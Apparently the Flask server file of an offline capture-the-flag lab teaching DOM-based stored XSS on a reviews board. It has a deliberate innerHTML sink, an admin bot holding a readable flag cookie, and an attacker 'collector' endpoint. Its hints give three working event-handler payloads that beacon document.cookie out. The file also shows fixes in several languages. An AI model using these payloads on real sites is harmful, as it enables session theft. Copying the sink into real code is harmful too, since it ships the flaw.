"""
WildWebApps lab - Stored XSS (Client-Side / DOM-based).

The vulnerability is real, and it lives entirely in client-side JavaScript: the
product-reviews board PERSISTS whatever you post (into SQLite) and serves it back
as JSON from ``/api/reviews``. The page then fetches that JSON and renders each
stored review body into the DOM with ``element.innerHTML`` (see static/app.js,
the block marked === VULNERABILITY ===). The server returns DATA, not HTML, and
never reflects anything itself; the unsafe write happens in the browser, so this
is DOM-based (client-side) stored XSS.

Two consequences that make this lab different from entry 02 (server-side stored):
  * The server emits no markup for the reviews - it returns JSON. View-Source is
    clean; the injected node only exists in the live DOM, built by JS after the
    fetch. Server-side output encoding does not apply (you encode HTML, the API
    returns data).
  * The sink is ``innerHTML``. The HTML5 spec says a <script> inserted via
    innerHTML does NOT execute, so a bare <script> payload is inert here. The
    exploit must use an event-handler payload such as <img src=x onerror=...>
    or <svg onload=...>.

How the flag is gated behind exploitation
-----------------------------------------
The flag never appears in the page and is never sent to you directly. It lives
ONLY as a (non-HttpOnly) session cookie in the *admin bot's* browser. Your own
browser holds no secret. To win you must:

  1. post a review whose body injects an event-handler payload (it is stored),
  2. trigger "Request admin review" (POST /review). The admin bot opens the
     NORMAL reviews page - no crafted URL - its JS fetches /api/reviews and
     renders your STORED payload via innerHTML, so it runs in the admin's session,
  3. have your script read ``document.cookie`` and beacon it to the same-origin
     collector (GET /collect), which appends it to /loot,
  4. read the flag from /loot and submit it.

This is the key difference from reflected XSS: you do not hand the victim a
payload-bearing link. You poison a stored record once and it fires for whoever
views the board - here, the logged-in admin.

The admin bot is a headless Chromium driven by Playwright. Everything stays on
127.0.0.1 and runs fully offline after the image is built.
"""
import os
import sqlite3
import time

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart).
FLAG = vulnlab.generate_flag()

PORT = int(os.environ.get("PORT", "8000"))
# The admin bot always browses the lab on its own loopback (keeps it offline +
# localhost-only). It opens the plain reviews page; the stored payload is what
# delivers the attack - no attacker-supplied URL is involved.
LOCAL_BASE = f"http://127.0.0.1:{PORT}"

# SQLite database for the persisted reviews. Re-created fresh on each start so a
# restart rotates the flag AND clears old payloads. (gitignored: *.db)
DB_PATH = os.path.join(os.path.dirname(__file__), "reviews.db")

# In-memory "attacker collector". Whatever an injected script beacons to
# /collect lands here and is shown on /loot. Capped so the lab can't grow forever.
LOOT: list[dict] = []
LOOT_MAX = 50


# ── Storage ──────────────────────────────────────────────────────────────────
def get_db() -> sqlite3.Connection:
    """A fresh connection per call - simplest and thread-safe for a lab."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db() -> None:
    """Recreate the reviews table and seed a couple of benign reviews."""
    conn = get_db()
    conn.execute("DROP TABLE IF EXISTS comments")
    conn.execute(
        "CREATE TABLE comments ("
        " id INTEGER PRIMARY KEY AUTOINCREMENT,"
        " name TEXT NOT NULL,"
        " body TEXT NOT NULL,"
        " ts TEXT NOT NULL)"
    )
    seed = [
        ("Ada", "Five stars - arrived a day early and works perfectly."),
        ("Lin", "Exactly as described. Would buy from this seller again."),
    ]
    for name, body in seed:
        conn.execute(
            "INSERT INTO comments (name, body, ts) VALUES (?, ?, ?)",
            (name, body, time.strftime("%Y-%m-%d %H:%M")),
        )
    conn.commit()
    conn.close()


def fetch_comments() -> list[dict]:
    conn = get_db()
    rows = conn.execute(
        "SELECT name, body, ts FROM comments ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ── The admin victim ─────────────────────────────────────────────────────────
def admin_visit(path_and_query: str) -> str:
    """
    Open `LOCAL_BASE + path_and_query` in a headless browser that is "logged in"
    as the admin - i.e. its browser context carries the flag as a readable
    cookie. The page's own JavaScript fetches /api/reviews and renders each
    stored review body into the DOM, so an injected event-handler payload runs
    here, in the admin's session. Returns "" on success or a short error string.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    target = LOCAL_BASE + path_and_query
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            try:
                ctx = browser.new_context()
                # The secret the attacker is after: a non-HttpOnly session cookie.
                ctx.add_cookies([{
                    "name": "session_flag",
                    "value": FLAG,
                    "url": LOCAL_BASE,
                    "httpOnly": False,   # readable by document.cookie - that's the point
                    "sameSite": "Lax",
                }])
                page = ctx.new_page()
                # load fires before the async fetch resolves; the short pause lets
                # the JS fetch /api/reviews, render the stored payload via
                # innerHTML, and the injected onerror/onload beacon fire.
                page.goto(target, wait_until="load", timeout=8000)
                page.wait_for_timeout(900)
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# ── Page content (themed lab chrome) ─────────────────────────────────────────
# Stored DOM-based XSS is a client-side JavaScript flaw, so the canonical
# examples are JavaScript and TypeScript: fetch the stored data, then write a
# record field into an innerHTML sink. A server language hosts it only by SHIPPING
# that vulnerable client renderer (its JSON API returns data, which is fine); the
# one server-side lever is the security headers it sends (CSP / Trusted Types).
# No server-side string encoding can fix a sink that runs in the browser.
LANGUAGES = {
    "JavaScript": {
        "vuln": (
            "const reviews = await (await fetch('/api/reviews')).json();\n"
            "// VULNERABLE: a STORED field written to an innerHTML sink\n"
            "list.innerHTML = reviews.map(r => `<li>${r.body}</li>`).join('');"
        ),
        "fixed": (
            "const reviews = await (await fetch('/api/reviews')).json();\n"
            "// FIXED: build nodes and set text - textContent never parses HTML\n"
            "for (const r of reviews) {\n"
            "  const li = document.createElement('li');\n"
            "  li.textContent = r.body; list.appendChild(li);\n"
            "}"
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent",
    },
    "TypeScript": {
        "vuln": (
            "const reviews: Review[] = await (await fetch('/api/reviews')).json();\n"
            "// VULNERABLE: types don't stop XSS - innerHTML still parses HTML\n"
            "list.innerHTML = reviews.map(r => `<li>${r.body}</li>`).join('');"
        ),
        "fixed": (
            "import DOMPurify from 'dompurify';\n"
            "const reviews: Review[] = await (await fetch('/api/reviews')).json();\n"
            "// FIXED: sanitize stored HTML before innerHTML (or use textContent)\n"
            "list.innerHTML = reviews.map(r => `<li>${DOMPurify.sanitize(r.body)}</li>`).join('');"
        ),
        "doc": "https://github.com/cure53/DOMPurify",
    },
    "Python": {
        "vuln": (
            "# Flask returns the stored rows as JSON (data - that part is fine).\n"
            "# The bug is in the inline JS this page ships, NOT in Python:\n"
            "#   fetch('/api/reviews').then(r=>r.json()).then(rows =>\n"
            "#     list.innerHTML = rows.map(r=>`<li>${r.body}</li>`).join(''))  # sink\n"
            "return jsonify(fetch_comments())"
        ),
        "fixed": (
            "# FIX is client-side (textContent / DOMPurify). The server's lever\n"
            "# is a header - Trusted Types blocks raw strings reaching innerHTML:\n"
            "@app.after_request\n"
            "def csp(resp):\n"
            "  resp.headers['Content-Security-Policy'] = \"require-trusted-types-for 'script'\"\n"
            "  return resp"
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for",
    },
    "Java": {
        "vuln": (
            "// The API returns JSON (data). The sink is in the client JS:\n"
            "//   list.innerHTML = rows.map(r => `<li>${r.body}</li>`).join('')\n"
            "resp.setContentType(\"application/json\");\n"
            "out.print(mapper.writeValueAsString(rows));"
        ),
        "fixed": (
            "// FIX the client renderer (textContent / DOMPurify); ship a header:\n"
            "resp.setHeader(\"Content-Security-Policy\",\n"
            "  \"require-trusted-types-for 'script'\");"
        ),
        "doc": "https://owasp.org/www-community/controls/Content_Security_Policy",
    },
    "PHP": {
        "vuln": (
            "// The API returns JSON (data). The sink is in the client JS:\n"
            "//   list.innerHTML = rows.map(r => `<li>${r.body}</li>`).join('')\n"
            "header('Content-Type: application/json');\n"
            "echo json_encode($rows);"
        ),
        "fixed": (
            "// FIX the client renderer (textContent / DOMPurify); send a header:\n"
            "header(\"Content-Security-Policy: require-trusted-types-for 'script'\");"
        ),
        "doc": "https://www.php.net/manual/en/function.header.php",
    },
    "Ruby": {
        "vuln": (
            "# The API returns JSON (data). The sink is in the client JS:\n"
            "#   list.innerHTML = rows.map(r => `<li>${r.body}</li>`).join('')\n"
            "content_type :json\n"
            "rows.to_json"
        ),
        "fixed": (
            "# FIX the client renderer (textContent / DOMPurify); set a header:\n"
            "headers 'Content-Security-Policy' =>\n"
            "  \"require-trusted-types-for 'script'\""
        ),
        "doc": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy",
    },
    "Go": {
        "vuln": (
            "// The API returns JSON (data). The sink is in the client JS:\n"
            "//   list.innerHTML = rows.map(r => `<li>${r.body}</li>`).join('')\n"
            "w.Header().Set(\"Content-Type\", \"application/json\")\n"
            "json.NewEncoder(w).Encode(rows)"
        ),
        "fixed": (
            "// FIX the client renderer (textContent / DOMPurify); send a header:\n"
            "w.Header().Set(\"Content-Security-Policy\",\n"
            "  \"require-trusted-types-for 'script'\")"
        ),
        "doc": "https://pkg.go.dev/net/http#Header.Set",
    },
    "C#": {
        "vuln": (
            "// The API returns JSON (data). The sink is in the client JS:\n"
            "//   list.innerHTML = rows.map(r => `<li>${r.body}</li>`).join('')\n"
            "app.MapGet(\"/api/reviews\", (AppDb db) =>\n"
            "  Results.Json(db.Comments.OrderByDescending(c => c.Id)));"
        ),
        "fixed": (
            "// FIX the client renderer (textContent / DOMPurify); add a header:\n"
            "ctx.Response.Headers.Append(\"Content-Security-Policy\",\n"
            "  \"require-trusted-types-for 'script'\");"
        ),
        "doc": "https://learn.microsoft.com/en-us/aspnet/core/security/content-security-policy",
    },
}

CONTEXT = vulnlab.lab_context(
    title="Stored XSS (Client-Side) - Product Reviews",
    owasp="A05:2025 - Injection",
    summary=(
        "This product-reviews board stores whatever you post, then serves the "
        "reviews back as JSON that client-side JavaScript renders into the page "
        "with innerHTML. The server returns data, not HTML, so View-Source is "
        "clean - this is DOM-based stored XSS. Your browser holds no secret, but "
        "the admin bot does. Poison a stored review, get the admin to view the "
        "board, and steal their session cookie to recover the flag."
    ),
    instructions=[
        "Post a review: it is saved server-side and served back from /api/reviews "
        "as JSON. The page's JavaScript fetches that JSON and renders each body "
        "via innerHTML. View-Source is clean - open DevTools to see the injected "
        "node in the live DOM.",
        "Your own session has no flag. The admin bot is logged in and its cookie "
        "(session_flag) is readable by JavaScript.",
        "Because the sink is innerHTML, a bare <script> will NOT run. Post a "
        "review whose body is an event-handler payload (e.g. <img src=x "
        "onerror=...> or <svg onload=...>).",
        "Click 'Request admin review'. The admin bot opens the normal board (no "
        "crafted URL); its JS renders your STORED payload and it runs in the "
        "admin's session.",
        "Open /loot, read the stolen session_flag value, and submit it below.",
    ],
    hints=[
        "Confirm the sink first: post  <img src=x onerror=alert(1)>  as a review "
        "body and reload. (A bare <script> stays inert because innerHTML does not "
        "execute it.)",
        "The collector at /collect accepts the cookie via GET or POST as the `c` "
        "parameter, so any channel works. Post any one of these as the review "
        "body (all event-handler based, since innerHTML won't run <script>):  "
        "(1) <img src=x onerror=\"new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`\">  "
        "(2) <img src=x onerror=\"fetch(`/collect?c=${encodeURIComponent(document.cookie)}`)\">  "
        "(3) <svg onload=\"navigator.sendBeacon(`/collect?c=${encodeURIComponent(document.cookie)}`)\">",
        "After posting, click 'Request admin review', then open /loot. Unlike "
        "reflected XSS you send the admin NO link - the stored review fires when "
        "their browser fetches and renders the board.",
        "Real-world control: serve  "
        "Content-Security-Policy: require-trusted-types-for 'script'; default-src 'self'  "
        "so innerHTML can no longer accept a raw string (Trusted Types), and a "
        "connect-src/img-src limited to trusted origins blocks the beacon. The "
        "true fix is in the client code: render each stored body with textContent, "
        "or sanitize it with DOMPurify before innerHTML. This lab ships neither so "
        "the payloads above all work.",
    ],
    languages=LANGUAGES,
    references=[
        ("OWASP - DOM Based XSS", "https://owasp.org/www-community/attacks/DOM_Based_XSS"),
        ("OWASP - Types of XSS (Stored)", "https://owasp.org/www-community/Types_of_Cross-Site_Scripting"),
        ("OWASP Cheat Sheet - DOM based XSS Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html"),
        ("PortSwigger - DOM-based XSS", "https://portswigger.net/web-security/cross-site-scripting/dom-based"),
    ],
)


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    # NOTE: there is deliberately NO server-side rendering of the reviews here.
    # The page is static; the vulnerability is entirely in static/app.js, which
    # fetches /api/reviews and writes each stored body to innerHTML. The server
    # only ships data (JSON), which is the whole point of DOM-based stored XSS.
    return render_template("index.html", **CONTEXT)


@app.route("/api/reviews")
def api_reviews():
    # Returns the stored reviews as JSON DATA. This endpoint is not itself the
    # bug - returning data as JSON is correct. The flaw is that the client writes
    # `body` into innerHTML (see static/app.js). JSON unicode-escapes any markup,
    # but the browser's JSON.parse restores it before it reaches the sink.
    return jsonify(fetch_comments())


@app.route("/comment", methods=["POST"])
def comment():
    """Persist a review. The body is stored verbatim (the sink is on render)."""
    name = (request.form.get("name", "").strip() or "anonymous")[:60]
    body = request.form.get("body", "").strip()
    if body:
        conn = get_db()
        conn.execute(
            "INSERT INTO comments (name, body, ts) VALUES (?, ?, ?)",
            (name, body, time.strftime("%Y-%m-%d %H:%M")),
        )
        conn.commit()
        conn.close()
    return redirect(url_for("index"))


@app.route("/review", methods=["POST"])
def review():
    """Ask the logged-in admin bot to review the board - it opens the plain
    reviews page, whose JS fetches /api/reviews and renders the STORED payload
    (if any) in its session."""
    err = admin_visit("/")
    return redirect(url_for("loot", err=err) if err else url_for("loot"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. An injected script beacons the stolen cookie here."""
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
    # 1x1 transparent GIF so an <img>/Image() beacon loads cleanly.
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return Response(gif, mimetype="image/gif")


@app.route("/loot")
def loot():
    """The attacker's view of captured data (values are auto-escaped by Jinja)."""
    return render_template("loot.html", loot=list(reversed(LOOT)),
                           err=request.args.get("err", ""), **CONTEXT)


@app.route("/check", methods=["POST"])
def check():
    submitted = request.form.get("flag", "")
    return jsonify(correct=vulnlab.check_flag(FLAG, submitted))


init_db()

if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    # threaded=True so the admin bot's page load (an inbound request) is served
    # while the /review request that launched it is still open.
    app.run(host=host, port=PORT, debug=False, threaded=True)
